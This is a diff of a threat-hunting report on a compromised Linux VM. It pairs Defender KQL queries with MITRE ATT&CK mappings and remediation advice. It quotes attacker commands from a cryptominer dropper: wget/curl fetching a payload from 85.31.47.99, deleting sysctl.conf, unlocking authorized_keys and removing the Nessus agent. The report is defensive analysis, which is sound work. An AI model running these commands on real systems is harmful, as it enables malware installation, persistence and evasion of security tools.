@@ -29,7 +29,6 @@ ${{\color{Red}\large{\textsf{Findings:\ }}}}\$
 
 ${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
 - T1592:Gathering Victim Host information
-- Detection:
 <br></br>
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ${{\color{Goldenrod}\large{\textsf{Device Logon Events\ }}}}\$
@@ -44,8 +43,6 @@ ${{\color{Red}\large{\textsf{Findings:\ }}}}\$
 
 ${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
 - T1110: Brute Force
-- Detection:
-<br></br>
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ${{\color{Goldenrod}\large{\textsf{Device Network Events\ }}}}\$
 ```
@@ -69,7 +66,6 @@ ${{\color{Red}\large{\textsf{Findings:\ }}}}\$
 | 196.251.73.38   | 3     |
 | 10.0.0.0        | 1     |
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-<br> </br>
 ${{\color{Goldenrod}\large{\textsf{Device Network Events\ }}}}\$
 ```
 DeviceNetworkEvents
@@ -80,7 +76,6 @@ ${{\color{Red}\large{\textsf{Findings:\ }}}}\$:
 - Total count of 184782
 - the device attempted to connect to various ip addresses that 184782 times.
 <br> </br>
-
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ${{\color{Goldenrod}\large{\textsf{Device File Events\ }}}}\$
 ```
@@ -96,7 +91,6 @@ ${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
 - T1565: Data Manipulation
 - Detection: File Creation, File Deletion, File Modification
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-<br> </br>
 ${{\color{Goldenrod}\large{\textsf{Device File Events\ }}}}\$
 ```
 DeviceFileEvents
@@ -110,9 +104,7 @@ ${{\color{Red}\large{\textsf{Findings:\ }}}}\$
 ${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
 - T1565: Data Manipulation
 - Detection: File Creation, File Deletion, File Modification
-<br> </br>
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
 ${{\color{Goldenrod}\large{\textsf{Device Process Events\}}}}\$
 ```
 DeviceProcessEvents
@@ -130,9 +122,8 @@ ${{\color{Red}\large{\textsf{Findings:\ }}}}\$
 <br> </br>
 
 ${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
-- T1222: File and directory permissions modiciation
-- Tactic: Defense Evation
-<br></br>
+- T1070-Indicator Removal on Host(Defense Evasion)
+- Detection: File Deletion, Modification,Process Creation
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ${{\color{Goldenrod}\large{\textsf{Device Process Events\}}}}\$
 
@@ -234,8 +225,7 @@ Miner
 - it extracts all valid system users from /etc/password
 - then it generates a password list of common patterns
 - pkill xmrig,killaall cnrig, killall xmrig: kills exisiting cryptominers
-<br></br>
-
+  
 ## Script Commands  
 ```
 wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu
@@ -248,6 +238,10 @@ ${{\color{Red}\large{\textsf{Findings:\ }}}}\$
 - crontab -r : aims to prevent system admins from scheduling security scans
 <br></br>
 
+${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
+- T1105-Ingress Tool Transfer
+- T1059-Command and Scripting Interpreter
+
 ## Script Commands 
 ```
 rm -rf /etc/sysctl.conf
@@ -255,9 +249,12 @@ echo "fs.file-max = 2097152" > /etc/sysctl.conf
 sysctl -p
 ```
 ${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
-- Attempts to Modify SYsyem Limits(Priviledge Escalation)
+- Attempts to Modify system Limits(Priviledge Escalation)
 - allowing more files to be open for intensive mining
-<br></br>
+
+${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
+- T1548- Abuse Elevation Control Mechanism
+
 
 ## Script Commands
 ```
@@ -269,13 +266,21 @@ ${{\color{Red}\large{\textsf{Findings:\ }}}}\$
 - /dev/shm/ is used to execute files in RAM, avoiding disk-based detection
 <br></br>
 
+${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
+- T1027-Obfuscated Files or Information
+- T1070-Indicator removal on Host
+
+
 ## Script Commands 
 ```
 chattr -iae ~/.ssh/authorized_keys
 ```
 ${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
 - Could disable SSH security and inset an attackers key for persitance
-<br></br>
+
+${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
+- T1098-Account Manipulation:SSH Authorized Keys
+
 
 ## Script Commands 
 ```
@@ -283,13 +288,58 @@ rm -f /opt/nessus_agent/var/nessus/tmp/nessusagent
 ```
 ${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
 - Attacker is forcibly removing the nessus agent to avoid detection as well as prevent vulnerability scanning of the vm
+
+${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
+- T1089-Disabling Security Tools
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+${{\color{Goldenrod}\large{\textsf{Device Logon Events\ }}}}\$
+```
+DeviceLogonEvents
+| where RemoteIP == "20.81.228.191"
+| project Timestamp, DeviceName, AccountName, LogonType, ActionType, RemoteIP, RemotePort
+| sort by Timestamp
+```
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$
+- Device name "xxlinuxprofixxx.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+${{\color{Goldenrod}\large{\textsf{Device Logon Events\ }}}}\$
+```
+DeviceLogonEvents
+| where RemoteIP == "20.81.228.191"
+| project Timestamp, DeviceName, AccountName, LogonType, ActionType, RemoteIP, RemotePort
+| summarize count()by ActionType
+```
+${{\color{Red}\large{\textsf{Findings:\ }}}}\$
+- 100 failed Logon Attempts
+
+${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
+- T1110: Brute Force
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+${{\color{GoldenRod}\huge{\textsf{Summary Findings:\ }}}}\$
+
+- Confirmed Brute Force Attempts: Over 400 failed login attempts, primarily from IP 20.81.228.191, validating credential stuffing activity (MITRE T1110).
+- Suspicious File and Process Activity: 592 files created and 7,025 files deleted, indicating script-based manipulation and evasion (MITRE T1565, T1070).
+- Cryptomining Malware Identified: Malicious shell scripts deployed cryptomining payloads (e.g., xmrig, cache) from external C2 servers (MITRE T1105, T1059).
+- Use of Obfuscation: Commands executed via hidden files and memory-based paths (e.g., /dev/shm/.x) to evade detection (MITRE T1027).
+- Security Tool Tampering: Attackers attempted to disable Nessus and remove audit trails to maintain persistence and avoid detection (MITRE T1089, T1070).
+- SSH Key Manipulation: Potential SSH persistence through modification of authorized_keys (MITRE T1098).
+- Privilege Escalation & Defense Impairment: System limits and logging policies were altered to enable long-term control and higher resource access (MITRE T1548, T1562).
+
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-## Conclusion
-Summarize the overall findings, potential impact, and next steps or recommendations.
+${{\color{GoldenRod}\huge{\textsf{Recommended Actions:\ }}}}\$
 
+- Isolate Affected Assets: Immediately quarantine sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net and any related systems.
+- Reset Credentials: Force password resets for all accounts accessed or attempted via brute force. Implement account lockout policies.
+- Reimage Infected Systems: Wipe and rebuild compromised devices to ensure complete removal of persistence mechanisms and backdoors.
+- Patch & Harden Systems: Ensure all systems are fully patched. Disable unused services and restrict access to critical files and directories.
+- Audit SSH Keys and Cron Jobs: Remove unauthorized SSH keys. Review and clean up crontab entries across users.
+- Monitor for Re-infection: Set up high-fidelity alerts for command-line usage of wget, curl, chmod, pkill, disown, etc.
+- Enable and Monitor EDR Logs: Ensure Defender for Endpoint and audit logging is fully operational and integrated with SIEM.
+- Update Detection Rules: Add IOCs (e.g., 85.31.47.99, dinpasiune.com, file hashes) to threat feeds and custom rules.
+- Educate and Alert Staff: Inform security teams of attack vectors used and conduct phishing/credential stuffing awareness training.
+- Conduct a Full Threat Hunt: Expand threat hunting scope across the environment for lateral movement and persistence artifacts.
 
-Summary
-- 
 
 
